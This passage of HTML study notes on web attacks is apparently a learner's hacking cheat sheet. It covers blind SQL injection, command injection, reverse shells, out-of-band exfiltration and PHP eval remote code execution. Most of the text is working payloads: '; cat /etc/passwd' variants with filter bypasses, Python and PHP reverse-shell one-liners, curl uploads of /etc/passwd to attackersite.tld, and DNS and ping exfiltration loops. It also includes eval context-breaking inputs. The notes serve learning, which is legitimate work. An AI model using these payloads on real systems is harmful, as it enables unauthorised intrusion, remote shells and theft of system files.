class="code"><code class="language-SQL">// Create a condition to work with
+True: me.php/?id=1 AND 1=IF(2&gt;1, sleep(6), 0)
+False: No delay.
+
+// Get database length using length() sql
+me.php/?id=1 AND 1=IF(SELECT LENGTH(DATABASE()))&gt;1, sleep(6), 0) // Try 2, 3, 4 ... until it returns error
+
+// Now that we know database name has 6 length, lets get them letter by letter using substr() sql
+me.php/?id=1 AND 1=IF(SELECT SUBSTR(DATABASE(), 1, 1)) = &#x27;a&#x27;, sleep(6), 0) // Try 2, 3, 4 ... AND b, c, d ... d
+
+// Now that we have the database name we try to get tables =&gt; columns =&gt; datas
+// proccess takes a alot of time but worth it :)</code></pre><p id="e7e0a077-dd83-429d-92c4-730092467857" class=""><strong>Note:</strong> if website delayed for 6 seconds on Test <mark class="highlight-red">≠</mark> Original <mark class="highlight-red">⇒ We can say it leaks.</mark></p><p id="f892a7c0-fa38-4418-a96e-4e5443801ec1" class="">
+</p><p id="3a65f60d-0e6a-493d-b132-bd3411574249" class="">
+</p><h1 id="01659dc4-3f64-43fa-9583-9d9283c62b48" class="">Command Injection:</h1><p id="af30cf95-f5f5-4a55-9dec-421367243165" class="">We use it when web application is intracting with cmd.</p><p id="4124f3b8-b5dc-4985-a6e6-ab2553d511be" class="">
+</p><h3 id="b1c0b444-129e-4d1f-9e0e-cd6c4692cfcd" class="">Example of intraction:</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d822ce7b-8277-412f-8d34-58ce93566901" class="code"><code class="language-Python">os.system(f&#x27;/bin/ffmpeg -i {video_name} -c:a copy -c:v vp9 -r 30 /files/user/{user_id}/videos&#x27;)</code></pre><p id="bd3c4ffb-3bb0-4b79-b95f-1df12f7fade3" class="">
+</p><h3 id="0c691dce-1005-48db-9eac-742a683e051b" class=""><mark class="highlight-default">Fuzzing:</mark></h3><p id="6364244a-9492-4321-b416-adf28c43df72" class="">Using fuzz (wierd inputs) to detect differ outputs. <mark class="highlight-red"><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md">more exmples.</a></mark></p><ul id="95e0d55c-9591-4917-84c2-f44040b3e829" class="bulleted-list"><li style="list-style-type:disc"><code>; cat /etc/passwd</code></li></ul><ul id="3870ab40-eb00-4972-9822-a9038bd3365f" class="bulleted-list"><li style="list-style-type:disc"><code>&amp;&amp; cat /etc/passwd</code></li></ul><ul id="7bfc9dc0-b73d-4eb7-89f2-fc5ead9aac58" class="bulleted-list"><li style="list-style-type:disc"><code>| cat /etc/passwd</code></li></ul><ul id="3a78340d-ad3d-4131-8203-40add89d4542" class="bulleted-list"><li style="list-style-type:disc"><code>|| cat /etc/passwd</code></li></ul><ul id="12f599a4-7ce8-41e7-b411-a9293c8d2d79" class="bulleted-list"><li style="list-style-type:disc"><code>`cat /etc/passwd</code></li></ul><ul id="a28be68e-6c6b-48ab-8f89-08244ed3af41" class="bulleted-list"><li style="list-style-type:disc"><code>$(cat /etc/passwd)</code></li></ul><ul id="2f998188-6668-4ade-b138-77f7c7315465" class="bulleted-list"><li style="list-style-type:disc"><code>{cat,/etc/passwd}</code></li></ul><ul id="2d56548f-6972-422b-b778-608a76276e6d" class="bulleted-list"><li style="list-style-type:disc"><code>cat$IFS/etc/passwd</code> </li></ul><ul id="558a19cc-e9eb-4f99-9ba1-99d29bed3dac" class="bulleted-list"><li style="list-style-type:disc"><code>cat{$IFS}/etc/passwd</code></li></ul><ul id="104bc826-3a55-4a70-b951-3d7f7d365eb1" class="bulleted-list"><li style="list-style-type:disc"><code>cat ${HOME:0:1}etc${HOME:0:1}passwd</code></li></ul><p id="2c187bf3-b29f-408d-98e8-5aa922c3dd09" class=""><strong>Note:</strong> <mark class="highlight-red">$IFS</mark> holds characters used to separate text into tokens</p><p id="aac464e3-350d-43fb-9aac-41831edc5757" class=""><strong>Note:</strong> <mark class="highlight-red">{HOME:0:1}</mark> is a brace expansion feature used in the shell. It is not a valid path or location.</p><p id="61e4ffb1-615a-4e8c-9f5c-cfdaa72c8bed" class="">
+</p><h2 id="1ab6e9a5-aeb0-4aa4-aa8c-5556a4bf18fe" class=""><mark class="highlight-red">Direct:</mark></h2><p id="7cfdb5d8-fbf0-41f9-b6d3-d9bc64c0b682" class="">Direct command injection returns output of execution.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7c05d9c1-a36f-48d7-8e4c-e6b86d5b62d8" class="code"><code class="language-Shell">// The api requests
+POST /api/v1/validate/epub HTTP/1.1
+Host: authors.apple.com
+{&quot;epubKey&quot;:&quot;2020_8_11/10f7f9ad-2a8a-44aa-9eec-8e48468de1d8_sample.epub&quot;,&quot;providerId&quot;:&quot;BrettBuerhaus2096637541&quot;}
+
+// Returned a command form result and hacker noticed
+[2020-08-11 21:49:59 UTC] &lt;main&gt; DBG-X:   parameter TransporterArguments = -m validateRawAssets -assetFile /tmp/10f7f9ad-2a8a-44aa-9eec-8e48468de1d8_sample.epub -dsToken **hidden value** -DDataCenters=contentdelivery.itunes.apple.com -Dtransporter.client=BooksPortal -Dcom.apple.transporter.updater.disable=true -verbose eXtreme -Dcom.transporter.client.version=1.0 -itc_provider BrettBuerhaus2096637541
+
+// So He changed the datas and send it again
+{&quot;providerId&quot;:&quot;BrettBuerhaus2096637541||test123&quot;}
+
+//and got the response
+/bin/sh: 1: test123: not found</code></pre><p id="afca2d1c-17fd-4a01-8059-85009d12ecc4" class="">
+</p><h2 id="31aca497-de5a-4eed-834b-d872ec4364c8" class=""><mark class="highlight-red">Blind:</mark></h2><p id="265e3d9f-dbd8-4690-830e-97f65420111f" class="">Blind command injection does not return output of execution.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d43a7ba6-59d0-4d91-a95d-89beaa1362b5" class="code"><code class="language-Plain Text">// The url was:
+https://toimitilat.lahitapiola.fi/system/images/BAhbCFsHOgZmSSJIMj█████████ZW5rYXR1XzFfanVsa2lzaXZ1M19MVF93LmpwZwY6BkVUWwk6B████ZlcnRJIiktc3RyaXAgLWludGVybGFjZSBQbGFuZSAtcXVhbGl0eSA4MCUGOwZU███TAyeAY7BlQ/00100_Kaisaniemenkatu_1_julkisivu3_LT_w.jpg
+
+// Hacker noticed the base64 /images/{base64}/image_url and decoded it, found out it look like a command so he added extra codes:
+command &amp;&amp; wget http://████████/d.html
+
+// after that he traced the wget request in his server and catched the injection.</code></pre><p id="a9074d99-8d27-4baa-8f01-cf80a0ac7928" class="">
+</p><h1 id="15408678-5f61-477e-945f-a25d7447a449" class="">Reverse Shell</h1><p id="0db80f35-70fa-4f15-9841-767f02e93f9a" class="">Getting direct access to the cmd, haha.</p><h2 id="fe07529b-0f59-4cc9-b2d9-b568327692f7" class=""><mark class="highlight-red">Spowning shell (Binding port):</mark></h2><p id="f4fa0fa3-b10b-41a4-8e44-c99fe1ddf2c4" class="">Its impossible these days.</p><p id="9d34a621-4202-442d-a2d7-a8208429c1f0" class="">So we will pass it …</p><h2 id="b3dd36fc-6f57-4bb4-b16c-7613c57708cc" class=""><mark class="highlight-red">Reverse shell:</mark></h2><p id="d075c5a8-f5ec-4923-8886-81450e6bddd5" class="">forcing machine to connect to you.</p><h3 id="d2fd6781-b20f-4c6d-9279-bbe56e3de7fb" class="">Steps:</h3><ul id="7e45c50d-fcb9-41e0-a7e5-7c0f66e4eda2" class="bulleted-list"><li style="list-style-type:disc">Attacker listens to a  port.</li></ul><ul id="7d990084-36dc-465d-bcac-2fc93107fbd0" class="bulleted-list"><li style="list-style-type:disc">Victim have to connect to that port.</li></ul><ul id="cc38c7aa-45c8-47f0-8999-a766d226f082" class="bulleted-list"><li style="list-style-type:disc">Victim spowns a shell</li></ul><ul id="c2c940b8-dd2b-44b2-9fdb-fceca383f9b4" class="bulleted-list"><li style="list-style-type:disc">Attacker with have the shell</li></ul><p id="f4227efa-5f7c-4854-b0e8-37f07625f3ad" class="">
+</p><h3 id="7f9d9f9d-8ace-488f-a9e6-9876ad68097f" class="">Example:</h3><p id="a20ce4b8-7b9c-4d4d-a615-7012fc7b438c" class=""><mark class="highlight-yellow"><strong>Python:</strong></mark></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6ff0656d-93c2-421f-9c50-098b74786c85" class="code"><code class="language-Shell">python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;IP&quot;,PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#x27;</code></pre><p id="9ea75f8d-64e6-4ead-8e17-89b8d55f947d" class=""><mark class="highlight-yellow"><strong>PHP:</strong></mark></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="546341e7-e418-48fb-99dd-89802b2eda24" class="code"><code class="language-Shell">php -r &#x27;$sock=fsockopen(&quot;10.10.10.10&quot;,9001);`sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3`;&#x27;</code></pre><p id="03b8c748-8cf5-4030-a2d1-f4e979bc2ff7" class=""><strong>Note: </strong>More details in <mark class="highlight-red"><a href="https://revshell.com">revshell.com</a></mark> .</p><p id="f6b74a12-d6db-4672-9a0c-074c9527b7a5" class="">
+</p><h2 id="d6ca525c-540d-4658-95ee-913122a1afb6" class=""><mark class="highlight-red">Exfilteration Data(Out Of Band):</mark></h2><p id="2f610743-c386-45de-80d5-267e6c0030b1" class="">Extract data from victim, usefull for blind command injection.</p><p id="3a2fbe34-16bb-4437-8c03-3d9a13c6941b" class="">
+</p><h3 id="3d7f5f40-328c-486a-af8e-f4009007e73b" class="">HTTP Exfilteration:</h3><ul id="637e0d7f-365f-444c-ba55-af5f592ad5cd" class="bulleted-list"><li style="list-style-type:disc">Using <mark class="highlight-red">curl </mark>and <mark class="highlight-red">wget</mark></li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1aac0a35-7016-4489-a4c6-7771d28d5b16" class="code"><code class="language-Shell">curl https://attackersite.tld -d &quot;${id}&quot; // sending output result
+curl https://attackersite.tld --data-binary @/etc/passwd // sending a file</code></pre><p id="61392d0f-c1b5-41b9-b677-a76f40209bc4" class="">
+</p><h3 id="922fa812-a696-4e16-b85a-564becf493b4" class="">DNS Exfilteration:</h3><ul id="a028d098-1e7b-42d5-bf05-5ea6d354adb3" class="bulleted-list"><li style="list-style-type:disc">You can use <mark class="highlight-red">host</mark>,  <mark class="highlight-red">ping </mark>or <mark class="highlight-red">dig </mark>to send data (which installed)</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f7fcd164-d34b-4df1-b939-ae6148e0e305" class="code"><code class="language-Shell">dig A +short $(whoami).attackersite.tld // and we will catch the response in our sever</code></pre><ul id="fa4b9296-f64f-44e8-bfd7-116a074ba5fe" class="bulleted-list"><li style="list-style-type:disc">Catching the results using <mark class="highlight-red">tail </mark>in our server</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d058a825-bd79-4df3-8afb-3ba8bb9184bf" class="code"><code class="language-Shell">tail  /var/log/named/named.log -f //returns all queries from everywhere to attacker 
+
+// Example of result
+2022-10-21 15:03:42: WARNING: client 192.168.0.1 #46450: query for sad.website.com from invalid source address
+2022-10-21 15:03:42: INFO: resolving puzzled sad.website.com...</code></pre><ul id="7933c628-d983-4559-9360-19331b3765f9" class="bulleted-list"><li style="list-style-type:disc">But is it always easy? no..</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b120887c-6e3c-4b05-9dfa-d1d55e5b70a7" class="code"><code class="language-Shell">// attacker encode the data and send them chunkly and the data comes to attacker server logs in binary
+uname -a | od -A n -t x1 | sed &#x27;s/ *//g&#x27; | while read lines; do ping -c 1 $lines.attackersite.tld; done
+   ↓             ↓               ↓                                     ↓                                   
+gets uname                 remove spaces
+       converts it to binary              run a while in the lines and do a ping with each line to website
+
+// we have to gather them all and decode them again
+echo &quot;DATA&quot; | xxd -r -p
+</code></pre><p id="0d359fe9-a7c3-4d12-96f5-7fa2a0397bfc" class=""><strong>Note:</strong> Exfilteration has more ways <mark class="highlight-red">google </mark>it …</p><p id="9c21dc78-8c3b-48af-8c8e-b764a59ef74b" class="">
+</p><p id="ab4bf6bb-d86d-4b92-be5a-6672cf8a2a23" class="">
+</p><h1 id="065a2c41-6ac9-4ae0-8f76-064e381b28b3" class="">Remote Code Execution(RCE)</h1><p id="9e119d02-d934-4196-b58a-dda41977eb9d" class="">Means to evaluate a code in a website without validation.</p><ul id="024d51d6-a571-4b53-be47-67db4a8908dc" class="bulleted-list"><li style="list-style-type:disc">Using <code>eval()</code> command in php (many langs have this)</li></ul><h3 id="0edd9342-f260-4d7c-ad9e-d05210af137e" class="">Example (app.php):</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="298bc553-dfa6-4b5d-bbbf-4872ba9b3cfa" class="code"><code class="language-PHP">&lt;?php
+$code = $_GET[&#x27;code&#x27;];
+$code = stripslashes($code);
+eval($code);
+?&gt;</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4417cd92-ece2-40a6-bfb6-f659052b8dd7" class="code"><code class="language-Shell">// We can evaluate everything
+php?code=system(&#x27;id&#x27;);</code></pre><ul id="54868ccc-5bcc-4c13-ab4b-d8355031be07" class="bulleted-list"><li style="list-style-type:disc">But is it always as easy as this? lets make it harder.</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="610905d4-c239-4b7f-bf45-a9816bcb1584" class="code"><code class="language-PHP">&lt;?php
+$code = $_GET[&#x27;code&#x27;];
+$code = stripslashes($code);
+eval(&quot;print(&#x27;$code&#x27;)&quot;);
+?&gt;
+
+// in this case we cannot use system directly, cuz input goes direcly to the function :(
+// So we need to break th context using same methods type as we did in sql injection ...</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="695a73d1-90c3-4d43-b7ed-51de163f54fe" class="code"><code class="language-PHP">// Input
+php?code=&#x27;);system(&#x27;id&#x27;);print(&#x27;
+         |---------------------|
+// Output
+	// Original
+	print(&#x27;$code&#x27;)
+	
+	// Break the context with input
+	print(&#x27;&#x27;);system(&#x27;ls .&#x27;);print(&#x27;&#x27;)</code></pre><p id="61b8ed45-5d81-42c7-89b0-dd7ca04c07a3" class=""><strong>Note:</strong> any lang can have <mark class="highlight-red">RCE </mark>inside just look for <mark class="highlight-red">eval()</mark> 🙂.</p><p id="6e1f0104-218a-4140-bee4-e5eef86af4c1" class="">Note: Same as command injection, there’s also blind RCE which does not return anything. so we have to use <mark class="highlight-red">DNS or HTTP exfilteration</mark> to get the data.</p><p id="a6f9b2e7-01de-4473-bf6b-527fcdaa3047" class="">
+</p><p id="5151c926-5bd0-42ab-8129-6dc64de9df69" class="">
+</p><h1 id="c512b4db-dbaa-41ad-983e-5ca4bc8af9a1" class="">Server Side Template Injection</h1><p id="4d188d02-a34e-4a51-863e-a46c2d529976" class="">Tommorow ….</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
